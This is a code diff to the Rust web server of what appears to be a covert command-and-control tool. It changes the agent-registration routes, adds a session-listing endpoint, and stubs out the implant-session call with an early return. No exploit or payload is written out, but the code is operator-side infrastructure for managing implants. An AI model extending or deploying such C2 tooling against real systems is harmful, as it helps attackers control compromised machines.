@@ -1,14 +1,15 @@
-use crate::{patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY};
+use crate::{patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY, SESSIONS};
 use covert_c2_ping_common::{ClientConfig, PingMessage};
 use serde::Deserialize;
 use std::{
     sync::atomic::{AtomicU16, Ordering},
-    time::Duration,
+    time::Duration
 };
 use tokio::task;
 use warp::{http::Response, Filter, Rejection, Reply};
 
-#[derive(Deserialize)]
+
+#[derive(Deserialize,Debug)]
 pub struct NewAgent {
     pub arch: String,
     pub sleep: u64,
@@ -30,14 +31,17 @@ pub async fn web_worker() -> () {
     let post = warp::post()
         .and(warp::body::json::<NewAgent>())
         .and_then(post_agent);
-    let api = warp::path("/api/agents").and(get.or(post).or(patch));
-    let root = warp::path("/").and(warp::filters::fs::dir("static"));
-    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8080)).await;
+    let api = warp::path!("api" / "agents").and(get.or(post).or(patch));
+    let root =warp::filters::fs::dir("covert_c2_ping_web/dist");
+    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8081)).await;
 }
 
 static AGENT_COUNT: AtomicU16 = AtomicU16::new(1);
 
 async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
+    tracing::info!("{:?}",new_agent);
+    let res = Response::builder().body(vec![1u8,2,3,4]).or(Err(warp::reject::reject()))?;
+    return Ok(res);
     let (payload, connection) =
         covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
             .await
@@ -72,4 +76,9 @@ async fn update_agent(config: PatchAgent) -> Result<impl Reply, Rejection> {
         );
     }
     Ok(warp::reply())
+}
+
+async fn get_agent_list() -> Result<impl Reply, Rejection> {
+    let keys: Vec<u16> = SESSIONS.lock().await.keys().map(|i| *i).collect();
+    Ok(warp::reply::json(&keys))
 }
